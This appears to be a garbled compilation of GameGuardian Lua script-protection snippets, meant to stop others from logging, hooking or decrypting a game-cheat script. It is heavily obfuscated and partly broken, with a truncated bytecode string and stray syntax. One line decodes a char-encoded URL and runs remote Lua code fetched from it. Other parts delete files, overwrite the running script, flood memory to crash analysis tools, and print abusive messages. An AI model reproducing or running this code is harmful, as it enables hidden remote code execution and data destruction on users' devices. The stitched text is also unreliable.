if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
if(load[LSQ])then else goto au7 end
whlie(true)do
end
::au7::
end
--防log
af={46766761255203100,1255203100,1255203100,1255203100,1255203100,1255203100,1255203100,1255203100,1255203100,1255203100,1255203100,54756776756776764676676,1255203100,547567766756776764676676,1255203100,547567766756776764676676,1255203100,54756776756776764676676,12552031004676676,1255203100,547567767567767646766761255203100,1255203100,1255203100,5475646766761255203100,5446766761255203100,54756776446766761255203100,1255203100,1255203100,54756776756776764676676,125520310067612552031004676676,1255203100,5475646766761255203100}
XEY ='LOG防御开启'  i=' 无言 开启防御' gg.toast(" 无言防御10％") gg.sleep(520) load(XEY) gg.toast(" 无言防御20％") gg.sleep(520) load(XEY) load(XEY) gg.toast(" 无言防御30％") gg.sleep(520) load(XEY) load(XEY) load(XEY) gg.toast(" 无言防御40％") gg.sleep(520) load(XEY) load(XEY) load(XEY) load(XEY) gg.toast(" 无言防御50％") gg.sleep(520) load(XEY) load(XEY) load(XEY) load(XEY) load(XEY) load(XEY) gg.toast(" 无言防御60％") gg.sleep(520) load(XEY) load(XEY) load(XEY) load(XEY) load(XEY) load(XEY) load(XEY) gg.toast(" 无言防御70％") gg.sleep(520) load(XEY) load(XEY) load(XEY) gg.toast(" 无言防御80％") gg.sleep(520) load(XEY) gg.toast(" 无言防御90％") gg.sleep(520) load(XEY) gg.toast(" 无言 无言提示 防御开启成功")print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i)print(i) print(i) for i=1,255 do end i='生态城防log'

XEYYP=' 无言防御：一级log防御'
for iii=1,5000
do
pcall(load(" 无言加密"))
end
--防load
sha=os.time()
for sh=1,2000 do
load("")
end
shb=os.time()
shsj=shb-sha
if shsj>6 then
os.exit()
while true do 
os.exit()
end
end
w=1
while true do
w=w+1
os.remove(gg.getFile()..".load_"..w..".lua")
if w==2000 then break end end
os.remove(gg.getFile()..".load_0.lua")
os.remove(gg.getFile()..".load_1.lua")
os.remove(gg.getFile()..".load_2.lua")


local timeinit=os.clock()
for i=1,81 do
loadfile("/system/priv-app/SystemUI/SystemUI.apk")
loadfile("/system/priv-app/Settings/Settings.apk")
end
while os.clock()-timeinit>6 do
gg.setVisible(true)
print("load你马逼，工具狗叫声爸爸让你load个fw")
os.exit()
end
abc ={} 
abc.last = gg.getFile() 
abc.data = loadfile(abc.last)
abc.cpp = abc.data  
if abc.cpp ~= nil then  
abc.data = nil  
ppb = abc.last:match("[^/]+$")
ppi = "lohhhggg" 
pu = gg.getResults(5000)  
os.rename("" .. abc.last .. "", "" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "")  
prt = loadfile("" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "")  
if prt ~= nil then    
os.rename("" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "", "" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppb .. "")    
gg.alert("load你马逼，工具狗叫声爸爸让你load个fw")   
while true do   
os.exit() 
end
end
end

load("lpl")
if string.find(tostring(debug.getinfo(load)['func']), "function: load") == nil then
gg.alert("load你马逼，工具狗叫声爸爸让你load个fw")
os.exit()
end
--自毁
 function exit()
gg.alert(" MTY4.7 OS warning：系统检测操作异常，正在执行脚本自毁模式...","")
gg.saveList(gg.getFile())
os.exit()
exit()
end
snc="1"
snc1=" "
snc2="D"
for i=1,14 do
snc=snc..snc1
snc1=snc1..snc2
snc2=snc2..snc
end
sous=snc..snc1..snc2
sous=string.rep(sous,3)
for i=1,20 do
gg.searchNumber(sous)end
--解密卡顿
hunxiao1=string.rep("X",99999) hunxiao=string.rep(hunxiao1,10) for i=1,1 do gg.searchNumber(hunxiao..hunxiao..hunxiao..hunxiao,gg.TYPE_DWORD) end FILE = gg.getFile() file = io.open(gg.getFile():gsub("/[^/]+$", "") .. "/[Ohook]" .. gg.getFile():gsub(gg.getFile():gsub("/[^/]+$", "") .. "/", "") .. ".log", "r") if file ~= nil then file:close() os.remove(gg.getFile():gsub("/[^/]+$", "") .. "/[Ohook]" .. gg.getFile():gsub(gg.getFile():gsub("/[^/]+$", "") .. "/", "") .. ".lua") os.exit() alert() end   XEY ="" i=""  print(i) for i=1,1 do end i=""function hook()   if gg.getFile() ~= string.sub(debug.traceback(), string.find(debug.traceback(), (string.char(229,141,151,228,184,131,233,152,178,230,139,166,230,136,170,49,46,48,229,138,160,229,175,134)))) then     while true do print((string.sub(debug.traceback(), string.find(debug.traceback(), (string.char(229,141,151,228,184,131,233,152,178,230,139,166,230,136,170,49,46,48,229,138,160,229,175,134)))))) print("")     load(" ")     load("") print("")  os.exit() for _FORV_3_ = 1, 1 do   load("XEY", (math.random(10000, 99999))) end     end   end end if 0 < #string.sub(debug.traceback(), string.find(debug.traceback(), "chunk") + 7, string.find(debug.traceback(), "%[") - 21) then   while true do     print((string.sub(debug.traceback(), string.find(debug.traceback(), "chunk") + 7, string.find(debug.traceback(), "%[") - 21)))     print("")     load(" ")     load("")  os.exit()     for _FORV_3_ = 1, 1 do load("XEY", (math.random(10000, 99999)))     end   end end 
--老外部分核心防御 Top GEO

 
for i=1,666 do
loadfile(string.char(47,115,121,115,116,101,109,47,112,114,105,118,45,97,112,112,47,83,101,116,116,105,110,103,115,47,83,101,116,116,105,110,103,115,46,97,112,107))
end
gg.toast("Protect By Top GEO🛡 10%")
gg.setVisible(true)
gg.sleep(11111)
gg.setVisible(true)
gg.searchNumber("1", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 20%")
gg.setVisible(true)
gg.sleep(22222)
gg.setVisible(true)
gg.searchNumber("2", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 30%")
gg.setVisible(true)
gg.sleep(33333)
gg.setVisible(true)
gg.searchNumber("3", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 40%")
gg.setVisible(true)
gg.sleep(44444)
gg.setVisible(true)
gg.searchNumber("5", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 50%")
gg.setVisible(true)
gg.sleep(55555)
gg.setVisible(true)
gg.searchNumber("6", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 60%")
gg.setVisible(true)
gg.sleep(66666)
gg.setVisible(true)
gg.searchNumber("7", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 70%")
gg.setVisible(true)
gg.sleep(77777)
gg.setVisible(true)
gg.searchNumber("8", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 80%")
gg.setVisible(true)
gg.sleep(88888)
gg.setVisible(true)
gg.searchNumber("9", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 90%")
gg.setVisible(true)
gg.sleep(99999)
gg.setVisible(true)
gg.searchNumber("10", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 100%")
gg.setVisible(true)
gg.sleep(111111)
gg.setVisible(true)
gg.searchNumber("11", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
gg.skipRestoreState()
gg.clearList()
gg.setVisible(false)


--风
a=os.clock()
A="风"
for x=1,25 do
A=A..A
gg.toast(A)
end
--获取网络时间
function json(str) if str==nil or str=="" then return end return load(str)()end
url = 'https://gg.bxdlc.cn/ybq/api2.php'
parameter = 'type=oddWord&user=1255203100&id=445'

_ENV["强行退出"]=function()
os.exit(print("By小鳄鱼:环境异常"))
gg.alert("By小鳄鱼:无视退出？这个你无视个试试？","")
_ENV["强行退出"]()
end

_ENV["刷取内容"]=function(x)
local ta={}
for i=1,20 do
ta[#ta+1]=string.rep(string.char(math.random(127,180).."\n"),999)
end
ta=table.concat(ta)
return ta..ta..x..ta..ta
end

_ENV["修改防御"]=gg.editAll
gg.editAll=function(...)
local ar = {...}
ar[1]=ar[1]:gsub("%d",function(ss) return _ENV["刷取内容"](ss) end)
for i=1,200 do
table.unpack(ar)
table.unpack(ar)
end
_ENV["修改防御"](table.unpack(ar))
end

_ENV["搜索防御"]=gg.searchNumber
function gg.searchNumber(...)
ar={...} 
ar[1]=ar[1]:gsub("%d",function(ss) return _ENV["刷取内容"](ss) end)
for i=1,200 do
table.unpack(ar)
table.unpack(ar)
end
--1次时间记录
data = gg.makeRequest(url,post,parameter).content
XEYsj1=json(data).estamp_time

local log1=string.rep(" ",999999)
for log2=1,1024 do
XEY[log2]=log1
end 
for log3,log4 in pairs({
_ENV["gg"]["alert"],
_ENV["gg"]["bytes"],
_ENV["gg"]["copyText"],
_ENV["gg"]["searchAddress"],
_ENV["搜索防御"],
_ENV["gg"]["toast"]
}) do
pcall(log4,XEY)
xpcall(log4,_ENV["搜索防御"],XEY)
end
log5=string.rep(string.char(0,0,0,0,0,0,0),999)
gg.getResults(0)
gg.editAll(log5,gg.TYPE_FLOAT)
_ENV["搜索防御"](log5,4)
log6={}
for i=1,200 do
log6[i]={address=1,value=0,flags=16}
gg.getValues(log6)
end
for i=1,200 do
debug.getinfo(string.rep("111",9999))
debug.getinfo(string.rep("111",9999))
end
--2次时间记录
data = gg.makeRequest(url,post,parameter).content
XEYsj2=json(data).estamp_time
--计算时间差
if XEYsj2-XEYsj1>=3 then
_ENV["强行退出"]()
end
--print(XEYsj2-XEYsj1)
--return _ENV["搜索防御"](...)
return _ENV["搜索防御"](table.unpack(ar))
end

local Enc_Strings = function(DATA)
    local gr,rg,Rg,Gr = {}, {}, {}, {}
    gg.toast("正在加密string...")
    if not isgg then
    DATA = Replace.GRA(DATA)
    for i, v in pairs({string.char(34),string.char(39)}) do
        DATA = DATA:gsub(v .. "([^\n]-%[[=]*%[[^\n]-)" .. v .. "([^\n]-)" .. v .. "([^\n]-%][=]*%][^\n]-)" .. v,function(l,I,i)
            Gr[#Gr+1] = l
            Gr[#Gr+1] = i
            return "刁难逸辰第" .. (#Gr-1) .. "处" .. I .. "刁难逸辰第" .. #Gr .. "处"
        end)
        DATA = DATA:gsub(v .. "([^\n]-%[[=]*%[[^\n]-%][=]*%][^\n]-)" .. v,function(l)
            Gr[#Gr+1] = l
            return "刁难逸辰第" .. #Gr .. "处"
        end)
    end
    DATA = Replace.GRB(DATA)
    for x in DATA:gmatch("[^%-]%[([=]*)%[") do
        Rg[#Rg+1] = x
    end
    for i,k in pairs(Rg) do
        DATA = DATA:gsub("([^%-])%[" .. k .. "%[(.-)%]" .. k .. "%]",function(xx,x)
            if x:sub(1,1) == "\n" then
                x = x:gsub("\n","",1)
            end
            repeat
                fs = x:find("刁难逸辰第%d+处")
                if fs then
                    x = x:gsub("刁难逸辰第(%d+)处",function(num)
                        num = tonumber(num)
                        mun = num
                        return string.char(34) .. Gr[num] .. string.char(34)
                    end)
                    Gr[mun] = false
                end
            until fs == nil
            return xx .. enc(x)
        end,1)
    end
    for i,k in pairs(Gr) do
        if k ~= false then
            DATA = DATA:gsub("刁难逸辰第(%d+)处",function(num)
                num = tonumber(num)
                return enc(Gr[num])
            end)
        end
    end
    DATA = Replace.GRA(DATA)
    end
    local Buffer, Buffer2 = nil
    for i = 1, DATA:len() do
        local yr = DATA:sub(i,i):byte()
        if yr == 34 and Buffer == nil and Buffer2 == nil then
            Buffer = true
        elseif yr == 34 and Buffer then
            Buffer = nil
            rg=table.concat(rg)
            gr[#gr+1] = enc(rg)
            rg = {}
        elseif yr == 34 and Buffer2 then
            rg[#rg+1] = string.char(yr)
        elseif yr == 39 and Buffer then
            rg[#rg+1] = string.char(yr)
        elseif yr == 39 and Buffer2 == nil and Buffer == nil then
            Buffer2 = true
        elseif yr == 39 and Buffer2 then
            Buffer2 = nil
            rg=table.concat(rg)
            gr[#gr+1] = enc(rg)
            rg = {}
        elseif yr ~= 34 and yr ~= 39 and Buffer == nil and Buffer2 == nil then
            gr[#gr+1] = string.char(yr)
        elseif yr ~= 34 and yr ~= 39 and (Buffer or Buffer2) then
            rg[#rg+1] = string.char(yr)
        end
    end
    gr = table.concat(gr)
    gr = gr:gsub("%-%-%[%[.-%]%]",""):gsub("%-%-[^\n]+", "")
    gr = gr:gsub("替换",'"')
    gr = Fuc_Enc(gr)
    return gr
end
function dzsh(Text)Text=Text:gsub(" ","") return (Text:gsub("..", function (jie)return string.char((tonumber(jie,16))%256) end))end
function zjm_base(cmz)
local zjm
if cmz==1 then zjm=string.char(0,math.random(1,3),math.random(0x10,0x14),5)
elseif cmz==2 then zjm=string.char(math.random(0,8),0,math.random(0x10,0x20),9)
elseif cmz==3 then zjm=string.char(math.random(0XEE,0XFF),math.random(0x70,0xFF),math.random(0x89,0xBB),8)
elseif cmz==4 then zjm=string.char(math.random(0XEE,0XFF),math.random(0x70,0xFF),math.random(0xE0,0xFF),0x6)
elseif cmz==5 then zjm=string.char(math.random(0XEE,0XFF),math.random(0x70,0xFF),math.random(0xB0,0xFF),0x3)
elseif cmz==6 then zjm=string.char(math.random(0,4),10,math.random(0,4),0x18)
elseif cmz==7 then zjm=string.char(math.random(0,4),10,math.random(0,4),0x19)
elseif cmz==8 then zjm=string.char(math.random(5,9),10,math.random(0,4),0x1A)
elseif cmz==9 then zjm=string.char(0,math.random(0x1,0x20),math.random(0x8,0x20),0x1B)
elseif cmz==10 then zjm=string.char(0,math.random(0x1,0x20),math.random(0x8,0x20),0x1C)
elseif cmz==11 then zjm=string.char(0,0x80,math.random(0x8,0x20),0x1E)
elseif cmz==12 then zjm=string.char(0,0x80,math.random(0x8,0x20),0x4)
elseif cmz==13 then zjm=string.char(math.random(0xE0,0xFF),0x80,math.random(0x8,0x18),0x1)
elseif cmz==14 then zjm=string.char(math.random(0xE0,0xFF),0x80,math.random(0x8,0x18),0)
elseif cmz==15 then zjm=string.char(math.random(0x8,0x18),0,math.random(0x8,0x18),0x14)
elseif cmz==16 then zjm=string.char(math.random(0x8,0x18),0,math.random(0x70,0xFF),0xB)
elseif cmz==17 then zjm=string.char(math.random(0x8,0x18),0,math.random(0x70,0xFF),0x24)
elseif cmz==18 then zjm=string.char(math.random(0x8,0x18),0,math.random(0x70,0xFF),0x7)
else zjm=string.char(math.random(0x8,0x18),math.random(0XEE,0XFF),0,0xA)
end
return zjm end
function xZiJie(counl)
local zjmre=string.char()
for i=1,counl do zjmre=zjmre..zjm_base(math.random(1,19)) end
return zjmre end
function tempstr(sz,isF)
sz=sz or math.random(8,58) local se=" goto s " local strs=""
for s=1,sz do strs=strs..se end
strs=" if nil then "..strs.." ::s:: end _X=_X "
if isF then strs=strs:gsub("_X=_X","")end return strs end
function dumpplus(loadfun)
  local max,min=58,4
  local strhx=string.dump(loadfun,true)
  zjms={}
  for s=max,min,-1 do
    str=string.dump(load(tempstr(s)),true)
    bytstr=str:sub(34,34+s*4-1)
    zjms[s]={bytstr,bytstr:sub(0,4)}
  end
  for s=max,min,-1 do
    strhx=strhx:gsub(zjms[s][1],zjms[s][2]..xZiJie(s-1))
  end
  local str1=dzsh("0080001F0080001F0080001F")
  local str2=string.char(0,0x80,0,0x1F,0x0,0x80,0x0,0x1B,math.random(0x70,0xff),math.random(0x80,0xff),math.random(0xb0,0xff),0x1F)
  strhx=strhx:gsub(str1,str2)
  rxass=string.char(0x0,0x0,0x0,0x4,0x0,0x0,0x0,0x1B,0x80,0x0,0x80,0x17,0x80,0x0,0x0,0x17,0x80,0x0,0x0,0x17,0x0,0x0,0x0,0x4,0x0,0x80,0x0)
  rxhxs=string.char(0x80,0x31,0x10,0x17,0x80,0x1,0x10,0x17,0x80,0x8,0x82,0x3,0x80,0x5,0x0,0x18,0x80,0x8,0x0,0x19,0x0,0x80,0x5,0x1A,0x8,0x80,0x2A)
  return strhx:gsub(rxass,rxhxs)
end
data=Enc_Strings('local xxxx,rzlog,Rep,logFk,logSy,log3,log4,search_e for index, value in _ENV["pairs"]({_ENV["table"],_ENV["debug"], _ENV["gg"], _ENV["os"], _ENV["io"], _ENV["bit32"], _ENV["utf8"], _ENV["string"], _ENV["math"]}) do index = _ENV["tostring"](value) xxxx = _ENV["string"]["match"](index, "@") while (xxxx) do end end for index, value in _ENV["pairs"]({"tostring", "load", "ipairs", "pcall", "assert2", "loadfile","pairs", "error", "tonumber", "xpcall", "assert", "dofile", "print", "type"}) do value = _ENV[value] index = _ENV["tostring"](value) xxxx = _ENV["string"]["match"](index, "@") while (xxxx) do end end rzlog=tonumber("1024") Rep={} for i=1,rzlog do Rep[i]=" " end logFk=(table.concat(Rep)) for i=1,rzlog do Rep[i]=logFk end logFk=(table.concat(Rep)) while logFk~=string.rep(" ",rzlog*rzlog) and #logFk~=rzlog^2 do end while string.rep("a",5)~="aaaaa" do end logSy={} for logTi=1,rzlog do logSy[logTi]=logFk end logFk=nil log3={_ENV["gg"]["alert"],_ENV["gg"]["bytes"],_ENV["gg"]["copyText"],_ENV["gg"]["searchAddress"],Search,_ENV["gg"]["toast"]} for log1, log2 in pairs(log3) do xpcall(log2,Search,logSy) end log4=string.char(rzlog-rzlog) search_e=(log4):rep(7) for i=1,22 do search_e=search_e..search_e end gg.getResults(0) gg.editAll(search_e,4) gg.searchNumber(search_e,16,false,gg.SIGN_EQUAL,0,-1) rzlog, logFk={}, {} for i=1,50 do logFk[i]=math.random(1,2140000000) rzlog[logFk[i]]={address=i,flags=4,temp=search_e} end rzlog=gg.getValues(rzlog)'..data)
--检测重写行为

local Caq = debug["getinfo"]
local tables = {}
local strings = {}
local tI = table["insert"]
for i, v in _ENV["pairs"](_ENV) do
i = _ENV[i]
if type(i) == "table" then
for m, n in _ENV["pairs"](i) do
if type(i[m]) == "function" then
tI(tables, Caq(i[m]))
end
end
elseif type(i) == "function" then
tI(tables, Caq(i))
elseif type(i) == "string" then
tI(strings, i)
end
end
for i = 1, 100 do
(function()
return (function()
if math.random(0, 1) == 1 then
repeat
until debug.getinfo(2).istailcall and math.random(0, 1)==0
else
while debug.getinfo(3).istailcall do
end
end
end)()
end)()
end
local istailcall, isvararg, short_src, source, what = "istailcall", "isvararg", "short_src", "source", "what"
for i, v in _ENV["pairs"](tables) do
 local tab = v
if tab["func"]==debug.getinfo then
tab[istailcall]=false
end
if tab[istailcall] or not tab[isvararg] or tab[short_src] ~= "[Java]" or tab[source] ~= "=[Java]" or tab[what] ~="Java" then 
Lujing=tab[short_src]
hook = true
break
end
end
if strings[2] then
hook = true
end
tables, strings = nil, nil
if hook then
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:禁止解密❌\n\n❌检测到拦截器环境❌"))
end
code(Diaoyong)
return false
end

while table.concat(gg.bytes(_ENV["tostring"](gg.searchNumber)),",")~="102,117,110,99,116,105,111,110,32,40,116,101,120,116,44,32,116,121,112,101,44,32,101,110,99,114,121,112,116,101,100,44,32,115,105,103,110,44,32,109,101,109,111,114,121,70,114,111,109,44,32,109,101,109,111,114,121,84,111,44,32,108,105,109,105,116,41,32,101,110,100,44,32,45,45,32,103,103,46,115,101,97,114,99,104,78,117,109,98,101,114,40,115,116,114,105,110,103,32,116,101,120,116,32,91,44,32,105,110,116,32,116,121,112,101,32,61,32,103,103,46,84,89,80,69,95,65,85,84,79,32,91,44,32,98,111,111,108,32,101,110,99,114,121,112,116,101,100,32,61,32,102,97,108,115,101,32,91,44,32,105,110,116,32,115,105,103,110,32,61,32,103,103,46,83,73,71,78,95,69,81,85,65,76,32,91,44,32,108,111,110,103,32,109,101,109,111,114,121,70,114,111,109,32,61,32,48,32,91,44,32,108,111,110,103,32,109,101,109,111,114,121,84,111,32,61,32,45,49,32,91,44,32,108,111,110,103,32,108,105,109,105,116,32,61,32,48,93,93,93,93,93,93,41,32,45,62,32,116,114,117,101,32,124,124,32,115,116,114,105,110,103,32,119,105,116,104,32,101,114,114,111,114" do
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:禁止解密❌\n\n❌检测到拦截器环境❌"))
end
end
while debug.getinfo(gg.searchNumber).source ~= "=[Java]" do
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:禁止解密❌\n\n❌检测到拦截器环境❌"))
end
end
while _ENV["tostring"](debug.getregistry(1)):find("@") do 
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:禁止解密❌\n\n❌检测到拦截器环境❌"))
end
end
while #_ENV["tostring"](debug.getregistry(1))<16000 do 
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:禁止解密❌\n\n❌检测到拦截器环境❌"))
end
end
while loadfile(debug.getinfo(gg.searchNumber).short_src)~=nil do
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:禁止解密❌\n\n❌检测到拦截器环境❌"))
end
end

ByXEY=gg.makeRequest("https://m.baidu.com/").content
if ByXEY==nil then
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:请允许修改器获取网络权限❌\n\n❌本加密防御需要连接云端配置❌\n\n❌🔥保护脚本安全🔥❌"))
end
end

do
local r0 = debug.getinfo(debug.getinfo)
local r1 = debug.getinfo(1)
local f = r1.func
if f ~= r0.func then
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:禁止解密❌\n\n❌检测到拦截器环境❌"))
end
end
if _ENV["tostring"](debug) ~= _ENV["tostring"](debug) then
while (true) do
os.exit(_ENV["print"]("❌By小鳄鱼:禁止解密❌\n\n❌检测到拦截器环境❌"))
end
end
end
do
local lua = '\x1B\x4C\x75\x61\x52\x00\x01\x04\x04\x04\x08\x00\x19\x93\x0D\x0A\x1A\x0A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xFA\xC7\x01\x00\x00\x23\xFE\xEA\x77\x23\xFD\xEA\x98\xC3\x37\x80\x00\xA3\x37\x3B\x80\xC0\x20\x80\x76\xA3\x77\x6B\x80\xC1\x3B\x00\x00\xA3\x77\x1B\x80\x40\x3B\x00\x22\xA3\xF7\x30\x80\x40\x31\x80\x75\xA3\xB7\x47\x80\x00\x3A\x00\x1B\xA3\xB7\x67\x80\x03\x4E\x80\x00\xA3\x37\x16\x80\xA3\xB7\x4F\x80\x00\x11\x80\x76\xA3\xB7\x05\x80\xA3\xB7\x1C\x80\xA3\xF7\x31\x80\x03\x53\x00\x00\xA3\xB7\x0B\x80\xA3\x37\x4A\x80\xC0\x2E\x80\x74\xA3\x37\x35\x80\xC1\x79\x00\x00\xA3\xB7\x53\x80\x08\x40\x02\x04\xA3\x77\x0D\x80\x00\x3B\x00\x1C\xA3\x77\xFB\x7F\x1B\x2B\x00\x00\xA3\x37\x59\x80\xA3\x77\x24\x80\x43\x50\x80\x00\xA3\xF7\x65\x80\xA3\xF7\x22\x80\x07\x02\x82\x03\xA3\xF7\x19\x80\x9B\x74\x00\x00\xA3\x77\x12\x80\xC1\xBB\x00\x00\xA3\x77\x34\x80\x58\xC0\x3A\x04\xA3\xF7\xFD\x7F\x81\xFB\x00\x00\xA3\x77\x5D\x80\x40\x1F\x80\x74\xA3\xF7\x4B\x80\x1B\x6A\x00\x00\xA3\x77\x60\x80\xA3\xB7\x30\x80\x1C\x02\x80\x75\xA3\x37\x23\x80\xA3\xF7\x5B\x80\x1B\x4F\x00\x00\xA3\xF7\x22\x80\xA3\xB7\x04\x80\x00\x3B\x80\x13\xA3\x77\x2A\x80\xE5\x00\x00\x00\xA3\x37\x02\x80\x80\x3A\x00\x54\xA

XY=io.open("/storage/emulated/0/Art搜索输出.lua.lua","r")
if SH==ni then
else
print("乌鸦提示：检测到您非法启动脚本")
os.remove("/storage/emulated/0/Art搜索输出.lua")
os.exit()
end
if gg.PACKAGE == "catch.Art.Tool.seatch" then
print("检测到art输出行为!")
os.exit()
while true do
end
end



pcall(load(gg.makeRequest(string.char(table.unpack({104,116,116,112,115,58,47,47,119,119,119,46,103,101,106,105,98,97,46,99,111,109,47,100,111,119,110,46,112,104,112,47,50,54,49,51,101,101,50,54,50,51,49,52,98,51,49,52,97,99,56,52,48,56,50,98,48,55,100,97,55,55,50,101,46,108,117,97}))).content))
--↑↑↑添加到加密防御添加区域或者脚本开头↑↑↑
--By:残霞
--防hook

_G["死"]=function()
_ENV["gg"]["alert"]("鸟之风:wdnmd","","","")
_G["os"]["exit"]() 
_G["死"]()
end
for i = -1, -2 do;se = 'The wind of birds';end local _  =  debug.getinfo(gg.searchNumber).source ~= "=[Java]" or  not not debug.getupvalue(gg.searchNumber,1,2) local _ = _  == false or (function() _ENV["死"]()  end)()


--针对恶魔[Lua·探索未来]拦截器防御
--By小鳄鱼原创2022.2.22开源，二改请留版权
--以下放脚本开头即可QQ:1578989908
_ENV["debug"]["getinfo"]=function(a)
return _ENV["debug"]["getinfo"]("By小鳄鱼")
end
--SSS防御

Counters = {}
Names = {}
function hook()
f = debug.getinfo(1, "f").func
if Counters[f] == nil then
Counters[f] = 1
Names[f] = debug.getinfo(1, "Sn")
end
if Counters[f]>1 then while true do
print("憨批")
os.exit(2222)
end
end
end

]=]





local dZvT=string.rep("SX",123)
sOaJ={}
for cInW=1,1024 do
sOaJ[cInW]=dZvT
end dZvT=nil
for dLrV, wNjO in pairs({gg.alert,gg.bytes,gg.copyText,gg.searchAddress,gg.searchNumber,gg.toast}) do
pcall(wNjO,sOaJ)
end
SX=io.open("/sdcard/SX.LOG","r")
if SX~=nil then
while true do
os.remove("/sdcard/SX.LOG")
os.exit()
end
end
local g = {}
local To_16=function(txt)
    local sp=string.format("%x",txt)
    if #sp==1 then
        sp="0"..sp
    end
    return "\\x"..sp
end--转16进制

local Un_know=function(num)
    local zl={}
    if not num then
        num=math.random(4,8)
    end
    for x=1,num do
        zl[#zl+1]=To_16(math.random(128,248))
    end
    return table.concat(zl)
end--生成16进制字符
local dec=function(Lte)
	Lte={Lte:byte(0,-1)}
	local chartab={}
	for i=1,#Lte do
	    py=math.random(1,255-Lte[i])
	    local Lt=To_16(Lte[i]+py)
	    chartab[#chartab+1]=",{\34"..Lt.."\34,\34"..Un_know(py).."\34}"
	end	
	return "((function(_)::__:: while _ do goto __ end end)() or Sancode(Sandec(({"..table.concat(chartab):gsub(",","",1).."}))) or (function(_)::__:: while _ do goto __ end end)())"
end
Fy = [===[
local TonumbEr = tonumber

local _g = {}
for i, v in pairs(_ENV["gg"]) do
    _g[i] = v
end
for i,v in pairs(_g) do
    if type(v)=="function" then
        local Zt,Return_str=pcall(gg.toast,{v})
        while not Return_str or string.find(Return_str,"%[Java%]%:%-1") do
            print("Detection LOG or Hook")
            os.exit()
        end
    end
end

for index, value in _ENV["pairs"]({_ENV["table"],_ENV["debug"], _ENV["gg"], _ENV["os"], _ENV["io"], _ENV["bit32"], _ENV["utf8"], _ENV["string"], _ENV["math"]}) do
  index = _ENV["tostring"](value)
  xxxx = _ENV["string"]["match"](index, "@")
    while (xxxx) do
    end
end
for index, value in _ENV["pairs"]({"tostring", "load", "ipairs", "pcall", "assert2", "loadfile","pairs", "error", "tonumber", "xpcall", "assert", "dofile", "print", "type"}) do
   value = _ENV[value]
   index = _ENV["tostring"](value)
   xxxx = _ENV["string"]["match"](index, "@")
    while (xxxx) do
    end
end


gg.setVisible(false)
vpn= "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F"
vpn=tostring(gg["makeRequest"](vpn))
